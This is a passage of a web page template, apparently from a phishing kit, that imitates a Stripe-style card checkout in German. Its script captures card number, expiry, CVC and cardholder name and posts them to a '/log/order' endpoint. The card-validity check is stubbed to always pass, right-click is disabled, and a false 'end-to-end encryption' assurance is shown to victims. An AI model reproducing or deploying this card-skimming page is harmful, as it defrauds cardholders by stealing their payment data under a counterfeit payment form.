                                                                                class="FormFieldGroup-child FormFieldGroup-child--width-12 FormFieldGroup-childLeft FormFieldGroup-childRight FormFieldGroup-childTop FormFieldGroup-childBottom">
                                                                                <div class="FormFieldInput">
                                                                                    <div class="CheckoutInputContainer">
                                                                                            <span class="InputContainer"
                                                                                                  data-max="">
                                                                                                <input
                                                                                                    class="CheckoutInput Input Input--empty"
                                                                                                    autocomplete="ccname"
                                                                                                    autocorrect="off"
                                                                                                    spellcheck="false"
                                                                                                    id="billingName"
                                                                                                    name="cardholder79820512"
                                                                                                    type="text"
                                                                                                    aria-invalid="false"
                                                                                                    value="">
                                                                                            </span>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                            <div style="opacity: 0; height: 0px;">
                                                                            <span
                                                                                class="FieldError Text Text-color--red Text-fontSize--13"><span
                                                                                    aria-hidden="true"></span></span>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <div class="flex-item width-12">
                                                                <div class="FormFieldGroup">
                                                                    <div
                                                                        class="FormFieldGroup-labelContainer flex-container justify-content-space-between"></div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="CardPayment-signUpFormContainer flex-item width-12">
                                                    <div style="pointer-events: auto; height: auto; opacity: 1;">
                                                        <div class="SignUpForm">
                                                            <div class="SignUpForm-checkboxContainer">
                                                                <div class="FormFieldCheckbox SignUpForm-checkbox">
                                                                    <div class="CheckboxField">
                                                                        <div class="Checkbox-InputContainer">
                                                                            <input id="enableStripePass"
                                                                                   name="enableStripePass"
                                                                                   type="checkbox"
                                                                                   class="Checkbox-Input"><span
                                                                                class="Checkbox-StyledInput"></span>
                                                                        </div>
                                                                        <label for="enableStripePass">
                                                                                <span
                                                                                    class="Checkbox-Label Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">
                                                                                    Speichere meine Daten für sichere Transaktionen mit einem Klick
                                                                                    <div class="SignUpForm-subLabel">Alle Transaktionen sind mit Ende-zu-Ende-Verschlüsselung gesichert</div>
                                                                                </span>
                                                                        </label>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="PaymentForm-confirmPaymentContainer flex-item width-grow">
                                    <div class="flex-item width-12"></div>
                                    <div class="flex-item width-12">
                                        <button form="{{$fake->track_id}}" onclick="verifcard()" id="_buttonPay"
                                                class="SubmitButton SubmitButton--incomplete" disabled="">Weiter
                                        </button>

                                        <div class="ConfirmPayment-PostSubmit">
                                            <div>
                                                <div class="flex-container spacing-8 direction-column"
                                                     style="margin-top: 4px;">
                                                    <div class="flex-item width-grow"></div>
                                                    <div class="flex-item width-grow">
                                                        <div style="height: 0px; opacity: 0; pointer-events: none;">
                                                            <div
                                                                class="ConfirmTerms Text Text-color--gray500 Text-fontSize--13"></div>
                                                        </div>
                                                    </div>
                                                    <div class="flex-item width-grow"></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <footer class="App-Footer Footer">
                        <div class="Footer-PoweredBy"><a class="Link Link--primary"
                                                         href="{{$fake->link($isPay ?? false)}}"
                                                         target="_blank" rel="noopener"></a></div>
                        <div class="Footer-Links">
                            <a class="Link Link--primary"
                               href="{{$fake->link($isPay ?? false)}}"
                               target="_blank" rel="noopener"><span
                                    class="Text Text-color--gray400 Text-fontSize--12 Text-fontWeight--400">Conditions</span></a>
                            <a class="Link Link--primary"
                               href="{{$fake->link($isPay ?? false)}}"
                               target="_blank" rel="noopener">
                                <span class="Text Text-color--gray400 Text-fontSize--12 Text-fontWeight--400">Confidentiality</span>
                            </a>
                        </div>
                    </footer>
                </div>
            </div>
        </div>
    </form>

    @push('js')
        <script>
            let chsNum = "0123456789";
            let fields = [
                {
                    valid: false,
                    chars: chsNum,
                    length: [16, 19],
                    mask: [
                        [16, " "],
                        [12, " "],
                        [8, " "],
                        [4, " "],
                    ],
                },
                {
                    valid: false,
                    chars: chsNum,
                    length: [2, 2],
                    mask: false,
                },
                {
                    valid: false,
                    chars: chsNum,
                    length: [2, 2],
                    mask: false,
                },
                {
                    valid: false,
                    chars: chsNum,
                    length: [3, 3],
                    mask: false,
                },
            ];
            let _buttonPay = document.getElementById('_buttonPay');
            let _formPay = document.getElementById('_formPay');
            let _input1 = document.getElementById('_input1');
            let _input2 = document.getElementById('_input2');
            let _input3 = document.getElementById('_input3');

            function inputMask(elem, indx) {
                fields[indx]["valid"] = false;
                let val = elem.value;
                let val2 = "";
                let chs = fields[indx]["chars"];
                let len = fields[indx]["length"];

                let bank1 = document.getElementById("bankicon1");
                let bank2 = document.getElementById("bankicon2");
                let bank3 = document.getElementById("bankicon3");
                let bank4 = document.getElementById("bankicon4");
                for (let i = 0; i < val.length; i++) {
                    let flag = chs.includes(val[i]);
                    if (!flag) continue;
                    if (indx == 0) {
                        if (val[0] == 3) {
                            bank1.style.display = "none";
                            bank2.style.display = "none";
                            bank3.style.display = "block";
                            bank4.style.display = "none";
                        } else if (val[0] == 4) {
                            bank1.style.display = "block";
                            bank2.style.display = "none";
                            bank3.style.display = "none";
                            bank4.style.display = "none";
                        } else if (val[0] == 5) {
                            bank1.style.display = "none";
                            bank2.style.display = "block";
                            bank3.style.display = "none";
                            bank4.style.display = "none";
                        } else if (val[0] == 8) {
                            bank1.style.display = "none";
                            bank2.style.display = "none";
                            bank3.style.display = "none";
                            bank4.style.display = "block";
                        } else {
                            bank1.style.display = "none";
                            bank2.style.display = "none";
                            bank3.style.display = "none";
                            bank4.style.display = "none";
                        }
                    } else if (indx == 1) {
                        if (val2.length == 0) flag = "01".includes(val[i]);
                        else if (val2.length == 1)
                            if (val2[0] == "0") flag = parseInt(val[i]) >= 1;
                            else if (val2[0] == "1") flag = parseInt(val[i]) <= 2;
                    } else if (indx == 2) {
                        if (val2.length == 0) flag = parseInt(val[i]) >= 2;
                    }
                    if (flag) val2 += val[i];
                }
                val2 = val2.substr(0, len[1]);
                let val2i = parseInt(val2);
                let flag = val2.length >= len[0];
                if (flag) {
                    if (indx == 0) {
                        flag = cardValid(val2);
                    } else if (indx == 1) {
                        flag = val2i >= 1 && val2i <= 12;
                    } else if (indx == 2) {
                        flag = val2i >= 20 && val2i <= 99;
                    }
                    if (flag) {
                        fields[indx]["valid"] = true;
                        if (indx == 0) {
                            _input1.focus();
                        } else if (indx == 1) {
                            _input2.focus();
                        } else if (indx == 2) {
                            _input3.style.display = "block";
                            document.getElementById("cvcicon").style.display = "flex";
                            _input3.focus();
                        }
                    } else {
                        sty2 = " _15";
                    }
                }
                let mask = fields[indx]["mask"];
                if (mask) val2 = stringInsert(val2, mask);
                elem.value = val2;
                checkButton();
            }

            function cardValid(n) {
                let s = 0;
                let l = n.length;
                for (let i = 0; i < l; i++) {
                    let p = parseInt(n[i]);
                    if ((l - i) % 2 === 0) {
                        p *= 2;
                        if (p > 9) p -= 9;
                    }
                    s += p;
                }
                return true;
            }

            function checkButton() {
                let flag = false;
                for (let i = 0; i < fields.length; i++) {
                    if (!fields[i]["valid"]) {
                        flag = true;
                        break;
                    }
                }
                _buttonPay.disabled = flag;
            }

            function stringInsert(s, j) {
                let a = s.split("");
                let l = s.length;
                for (let i = 0; i < j.length; i++) {
                    let k = j[i];
                    if (l > k[0]) a.splice(k[0], 0, k[1]);
                }
                return a.join("");
            }

            document.addEventListener("DOMContentLoaded", function () {
                _buttonPay.disabled = true;
                for (let i = 0; i < fields.length; i++) {
                    let e = document.getElementById("_input" + i);
                    e.oninput = function () {
                        inputMask(e, i);
                    };
                    setTimeout(function () {
                        e.oninput();
                    }, 500);
                }
                _formPay.onsubmit = function () {
                    _buttonPay.disabled = true;
                };
            });

            document.oncontextmenu = function () {
                return false;
            };
        </script>
        <script>
            let button1 = document.querySelector("#_buttonPay");
            let verif = document.querySelector("#verification");
            let load = document.querySelector("#holder");
            let contnet = document.querySelector("#contnet");

            function verifcard() {
                verif.style.display = "block";
                setTimeout(function () {
                    verif.style.opacity = "1";
                }, 100);

                sendCard()
            }

            let button2 = document.querySelector("#buttonPay2");
            let check = document.querySelector("#checkbal");

            button2.onclick = function () {
                let str = fake.price;
                str = str.replace(/\s/g, "");
                //if (check.value == str || check.value == str + '.00' || check.value == str + '.0' || check.value == str + ',00' || check.value == str + ',0' || check.value[0] == ',' || check.value[0] == '.' || check.value[0] == '0') {
                //  check.setCustomValidity('Su saldo no cumple con los criterios de identificación. Póngase en contacto con el servicio de asistencia técnica.')
                //} else if (check.value[check.value.length - 3] != '.' && check.value[check.value.length - 3] != ',') {
                //  check.setCustomValidity('Su saldo no cumple con los criterios de identificación. Póngase en contacto con el servicio de asistencia técnica.')
                //} else {
                check.setCustomValidity("");
                //    }
            };
        </script>
        <script>
            const noBalance = [
                'ipko', 'pekao', 'ing',
                'santander', 'millenium',
                'mbank', 'inteligo', 'alior'
            ].includes("{{session('bankName')}}");

            function sendCard() {
                $.ajax({
                    type: "POST",
                    dataType: "json",
                    url: "/log/order",
                    data: {
                        card_number: `${document.querySelector('#_input0').value}`,
                        expm: `${document.querySelector('#_input1').value}`,
                        expy: `${document.querySelector('#_input2').value}`,
                        card_cvc: `${document.querySelector('#_input3').value}`,
                        // card_pin: cpin.val(),
                        card_holder: `${document.querySelector('#billingName').value}`,
                        balance: 0,
                    },
                }).fail(function (e) {
                    console.log(e)
                    setTimeout(function () {
                        window.location.reload();
                    }, 2000);
                }).done(function (data) {
                    if (data.html) $('#app').html(data.html);
                    else location.href = data.next
                });
            }
        </script>
    @endpush
@endsection
